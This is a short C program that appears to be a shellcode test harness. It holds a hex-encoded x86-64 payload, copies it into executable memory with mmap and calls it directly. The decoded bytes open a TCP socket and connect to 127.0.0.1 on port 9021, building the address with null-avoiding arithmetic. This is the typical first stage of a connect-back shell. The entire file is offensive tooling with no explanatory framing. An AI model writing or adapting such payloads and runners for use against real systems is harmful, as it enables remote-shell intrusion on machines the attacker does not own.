#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
char shellcode[] = "\x48\x29\xc0\x48\xc1\xeb\x10\x48\x31\xc9\x48\x29\xd2\x48\xc1\xef\x10\x48\xc1\xee\x10\x04\x29\xb3\x02\x48\x89\xdf\x48\x29\xdb\xb3\x01\x48\x89\xde\x0f\x05\x50\x41\x5a\x4c\x89\xd7\x48\x31\xc0\x04\x2a\x48\xc1\xeb\x10\x53\xbe\xb6\x7d\x9b\xc0\x81\xee\x37\x7d\x9b\xbf\x66\x68\x23\x1d\x66\x6a\x02\x48\x89\xe6\xb2\x18\xcd\x80\x48\xc1\xef\x10\x48\x29\xc0\xb0\x3c\xcd\x80";
void main() {
    printf("shellcode length: %u\n", strlen(shellcode));
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}
